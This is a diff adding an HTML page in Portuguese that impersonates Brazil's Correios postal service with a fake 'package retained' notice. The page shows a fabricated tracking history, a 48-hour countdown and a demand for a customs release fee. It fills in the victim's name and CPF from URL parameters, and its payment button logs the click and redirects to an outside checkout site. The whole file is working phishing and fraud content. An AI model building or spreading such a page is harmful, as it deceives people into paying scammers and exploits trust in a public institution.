@@ -1,0 +1,341 @@
+<!DOCTYPE html><html lang="pt-br"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="css/css2-1.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/hgi-stroke-rounded-1.css">
+    <script src="browser%25404-1"></script>
+    <style>
+        * {
+            font-family: 'Roboto', sans-serif !important;
+        }
+        @keyframes pulse-urgent {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        .pulse-urgent {
+            animation: pulse-urgent 1s ease-in-out infinite;
+        }
+    </style>
+    <title>Encomenda Retida - Correios</title>
+</head>
+<body class="bg-gray-100">
+    <header class="p-2 text-cyan-700 text-xs bg-zinc-100">
+        <span>Acessibilidade <b class="text-xs">▼</b></span>
+    </header>
+
+    <hr class="border-white">
+
+    <header class="bg-zinc-100 p-2 flex items-center justify-between">
+        <i class="hgi hgi-stroke hgi-menu-01 text-2xl font-bold text-cyan-700"></i>
+        <img src="images/logo-1.svg" alt="Logo" class="w-30">
+        <img src="images/sair-1.svg" alt="Logo" class="w-8">
+    </header>
+    
+    <hr class="border-orange-500">
+
+    <div class="bg-red-600 text-white py-2 px-3 flex items-center justify-center gap-2 flex-nowrap">
+        <span class="font-bold text-sm pulse-urgent whitespace-nowrap">⚠️ Encomenda será devolvida em</span>
+        <span class="text-lg font-bold bg-red-800 px-2 py-0.5 rounded whitespace-nowrap" style="min-width: 90px; text-align: center;" id="countdown">48:00:00</span>
+    </div>
+
+    <div class="p-4">
+       
+           <div class="bg-white rounded-xl shadow-lg overflow-hidden mb-4">
+            <div class="bg-cyan-700 text-white p-3">
+                <div class="flex items-center justify-between gap-2">
+                    <div class="min-w-0">
+                        <p class="text-xs opacity-80">Rastreio</p>
+                        <p id="codigo-rastreio" class="font-bold text-sm tracking-wider">Aguardando...</p>
+                    </div>
+                    <div class="bg-red-500 px-2 py-1 rounded-full text-xs font-bold whitespace-nowrap">
+                        RETIDO
+                    </div>
+                </div>
+            </div>
+            
+            <div class="p-4 border-b border-gray-100">
+                <p class="text-xs text-gray-500 mb-1">Destinatário</p>
+                <p id="nome-dinamico" class="font-bold text-gray-800 uppercase"></p>
+                <p id="cpf-dinamico" class="text-sm text-gray-600">CPF: </p>
+            </div>
+            
+            
+            <div class="p-4 grid grid-cols-2 gap-4 border-b border-gray-100">
+                <div>
+                    <p class="text-xs text-gray-500">Origem</p>
+                    <p class="font-semibold text-gray-800 text-sm">São Paulo/SP</p>
+                </div>
+                <div>
+                    <p class="text-xs text-gray-500">Local</p>
+                    <p class="font-semibold text-gray-800 text-sm">Curitiba/PR</p>
+                </div>
+                <div>
+                    <p class="text-xs text-gray-500">Status</p>
+                    <p class="font-semibold text-red-600 text-sm">Aguardando Pagamento</p>
+                </div>
+                <div>
+                    <p class="text-xs text-gray-500">Prazo</p>
+                    <p class="font-semibold text-red-600 text-sm">48 horas</p>
+                </div>
+            </div>
+<div class="p-4 border-b border-gray-100">
+                <div class="flex justify-center">
+                   
+    <div class="p-4 border-b border-gray-100">
+    <div class="flex justify-center">
+        <div id="imagem-container" class="relative inline-block max-w-full transition-opacity duration-700 ease-in-out opacity-100">
+            
+            <img id="imagem-pacote" src="images/bfffe187-cf8d-49d6-9881-c26c51c54773.png" alt="Pacote" class="w-full h-auto rounded-lg">
+            
+            <p id="overlay-nome" class="absolute text-gray-900 font-bold text-[9.5px] sm:text-xs md:text-sm" style="top: 47%; left: 19%; transform: rotate(0deg);">
+            </p>
+            
+            <p id="overlay-cpf" class="absolute  text-[10px] sm:text-[11px] md:text-xs" style="top: 58.2%;left: 29%;transform: rotate(1deg);">
+            </p>
+        </div>
+    </div>
+</div>
+</div>
+                </div>
+            </div>
+                        
+            <div class="p-3 bg-amber-50">
+                <p class="font-bold text-gray-800 text-sm text-center">⚠️ Taxa de Liberação Aduaneira</p>
+                <p class="text-xs text-gray-600 mt-1 text-center">Pague a taxa para liberar sua encomenda.</p>
+            </div>
+            
+            <div class="p-4">
+                <button onclick="trackPaymentClick()" class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-3 px-4 rounded-xl text-base transition-colors shadow-lg">
+                    PAGAR E LIBERAR
+                </button>
+                <p class="text-center text-xs text-gray-500 mt-2">🔒 Pagamento Seguro</p>
+            </div>
+        </div>
+
+        <div class="bg-red-50 border border-red-200 rounded-xl p-3 mb-4 text-center">
+            <p class="font-bold text-red-700 text-sm">⚠️ Sem pagamento = Devolução</p>
+            <p class="text-xs text-red-600 mt-1">Após o prazo, o pacote será devolvido ou destruído.</p>
+        </div>
+
+        <div class="bg-white rounded-xl shadow-lg p-4">
+            <h3 class="font-bold text-gray-800 mb-4">Histórico de Rastreamento</h3>
+            <div class="relative">
+                <div class="absolute left-4 top-0 bottom-0 w-0.5 bg-gray-200"></div>
+                
+                <div class="flex items-start gap-4 pb-4">
+                    <div class="w-8 h-8 bg-red-500 rounded-full flex items-center justify-center flex-shrink-0 relative z-10">
+                        <i class="hgi hgi-stroke hgi-dollar-02 text-sm text-white"></i>
+                    </div>
+                    <div class="flex-1">
+                        <p class="font-bold text-red-600 text-sm">Aguardando Pagamento da Taxa</p>
+                        <p class="text-xs text-gray-500">21/10/2026 00:56</p>
+                    </div>
+                </div>
+                
+                <div class="flex items-start gap-4 pb-4">
+                    <div class="w-8 h-8 bg-orange-400 rounded-full flex items-center justify-center flex-shrink-0 relative z-10">
+                        <i class="hgi hgi-stroke hgi-alert-02 text-sm text-white"></i>
+                    </div>
+                    <div class="flex-1">
+                        <p class="font-bold text-gray-800 text-sm">Objeto Tributado</p>
+                        <p class="text-xs text-gray-600">Encaminhado para fiscalização aduaneira</p>
+                        <p class="text-xs text-gray-500">20/10/2026 21:53</p>
+                    </div>
+                </div>
+                
+                <div class="flex items-start gap-4 pb-4">
+                    <div class="w-8 h-8 bg-yellow-400 rounded-full flex items-center justify-center flex-shrink-0 relative z-10">
+                        <i class="hgi hgi-stroke hgi-package text-sm text-cyan-700"></i>
+                    </div>
+                    <div class="flex-1">
+                        <p class="font-bold text-gray-800 text-sm">Objeto em Fiscalização</p>
+                        <p class="text-xs text-gray-600">CURITIBA/PR - Centro de Distribuição</p>
+                        <p class="text-xs text-gray-500">19/10/2026 14:28</p>
+                    </div>
+                </div>
+                
+                <div class="flex items-start gap-4 pb-4">
+                    <div class="w-8 h-8 bg-cyan-600 rounded-full flex items-center justify-center flex-shrink-0 relative z-10">
+                        <i class="hgi hgi-stroke hgi-shipping-truck-02 text-sm text-white"></i>
+                    </div>
+                    <div class="flex-1">
+                        <p class="font-bold text-gray-800 text-sm">Objeto em Trânsito</p>
+                        <p class="text-xs text-gray-600">SÃO PAULO/SP - Centro de Distribuição</p>
+                        <p class="text-xs text-gray-500">16/10/2026 18:42</p>
+                    </div>
+                </div>
+                
+                <div class="flex items-start gap-4">
+                    <div class="w-8 h-8 bg-gray-400 rounded-full flex items-center justify-center flex-shrink-0 relative z-10">
+                        <i class="hgi hgi-stroke hgi-package text-sm text-white"></i>
+                    </div>
+                    <div class="flex-1">
+                        <p class="font-bold text-gray-800 text-sm">Objeto Postado</p>
+                        <p class="text-xs text-gray-600">SÃO PAULO/SP</p>
+                        <p class="text-xs text-gray-500">15/10/2026 13:56</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    
+
+    <footer class="bg-yellow-400 p-6">
+        <div class="max-w-6xl mx-auto">
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                <div>
+                    <h3 class="text-lg font-bold text-gray-800 mb-3">Fale Conosco</h3>
+                    <ul class="space-y-2">
+                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Registro de Manifestações</a></li>
+                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Central de Atendimento</a></li>
+                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Soluções para o seu negócio</a></li>
+                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Suporte ao cliente com contrato</a></li>
+                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Ouvidoria</a></li>
+                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Denúncia</a></li>
+                    </ul>
+                </div>
+                
+                <div>
+                    <h3 class="text-lg font-bold text-gray-800 mb-3">Sobre os Correios</h3>
+                    <ul class="space-y-2">
+                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Identidade corporativa</a></li>
+                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Educação e cultura</a></li>
+                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Código de ética</a></li>
+                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Transparência e prestação de contas</a></li>
+                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Política de Privacidade e Notas Legais</a></li>
+                    </ul>
+                </div>
+                
+                <div>
+                    <h3 class="text-lg font-bold text-gray-800 mb-3">Outros Sites</h3>
+                    <ul class="space-y-2">
+                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Loja online dos Correios</a></li>
+                    </ul>
+                </div>
+            </div>
+            
+            <div class="text-center mt-6 pt-4 border-t border-yellow-500">
+                <p class="text-sm text-gray-800">© Copyright 2025 Correios</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        function startCountdown() {
+            let endTime = localStorage.getItem('countdownEnd_d41d8cd98f00b204e9800998ecf8427e');
+            
+            if (!endTime) {
+                endTime = new Date().getTime() + (48 * 60 * 60 * 1000);
+                localStorage.setItem('countdownEnd_d41d8cd98f00b204e9800998ecf8427e', endTime);
+            }
+            
+            function updateCountdown() {
+                const now = new Date().getTime();
+                const distance = endTime - now;
+                
+                if (distance < 0) {
+                    document.getElementById('countdown').textContent = 'PRAZO EXPIRADO';
+                    return;
+                }
+                
+                const hours = Math.floor(distance / (1000 * 60 * 60));
+                const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+                const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+                
+                document.getElementById('countdown').textContent = 
+                    String(hours).padStart(2, '0') + ':' + 
+                    String(minutes).padStart(2, '0') + ':' + 
+                    String(seconds).padStart(2, '0');
+            }
+            
+            updateCountdown();
+            setInterval(updateCountdown, 1000);
+        }
+        
+        startCountdown();
+
+        function trackPaymentClick() {
+            fetch('../includes/tracking.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: 'action=payment_click'
+            });
+            
+            window.location.href = 'https://pagamento.pagarpedidos.site/checkout/imjkES6SGnFzhTID';
+        }
+
+            </script>
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const nomeBruto = urlParams.get('nome');
+    const cpfBruto = urlParams.get('cpf');
+
+    // 1. Funções de Formatação (Nome e CPF)
+    function formatarNome(texto) {
+        if (!texto) return '';
+        const preposicoes = ['de', 'da', 'do', 'das', 'dos', 'e'];
+        return texto.toLowerCase().split(' ').map(palavra => {
+            if (preposicoes.includes(palavra)) return palavra;
+            return palavra.charAt(0).toUpperCase() + palavra.slice(1);
+        }).join(' ');
+    }
+
+    function formatarCPF(cpf) {
+        if (!cpf) return '';
+        const numeros = cpf.replace(/\D/g, '');
+        if (numeros.length === 11) {
+            return numeros.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+        }
+        return cpf; 
+    }
+
+    const nomeFormatado = formatarNome(nomeBruto);
+    const cpfFormatado = formatarCPF(cpfBruto);
+
+    // 2. Preenche os Dados
+    if (nomeFormatado) {
+        document.getElementById('overlay-nome').textContent = nomeFormatado;
+        const elementoNomeDinamico = document.getElementById('nome-dinamico');
+        if (elementoNomeDinamico) elementoNomeDinamico.textContent = nomeFormatado;
+    }
+    
+    if (cpfBruto) {
+        const overlayCpf = document.getElementById('overlay-cpf');
+        if (overlayCpf) overlayCpf.textContent = cpfFormatado;
+        
+        const elementoCpfDinamico = document.getElementById('cpf-dinamico');
+        if (elementoCpfDinamico) elementoCpfDinamico.textContent = 'CPF: ' + cpfFormatado;
+
+        const elementoRastreio = document.getElementById('codigo-rastreio');
+        if (elementoRastreio) {
+            const cpfApenasNumeros = cpfBruto.replace(/\D/g, ''); 
+            const cpfNoveDigitos = cpfApenasNumeros.substring(0, 9);
+            elementoRastreio.textContent = 'NB' + cpfNoveDigitos + 'BR';
+        }
+    }
+
+    // 3. LÓGICA DE EXIBIÇÃO DA IMAGEM
+    const imagemContainer = document.getElementById('imagem-container');
+    const imagemPacote = document.getElementById('imagem-pacote');
+
+    function revelarImagem() {
+        imagemContainer.classList.remove('opacity-0');
+        imagemContainer.classList.add('opacity-100');
+    }
+
+    // Verifica se a imagem já está no cache do navegador
+    if (imagemPacote.complete) {
+        revelarImagem();
+    } else {
+        // Se não estiver, aguarda o evento de load da imagem
+        imagemPacote.addEventListener('load', revelarImagem);
+    }
+});
+</script>
+
+
+</body></html>
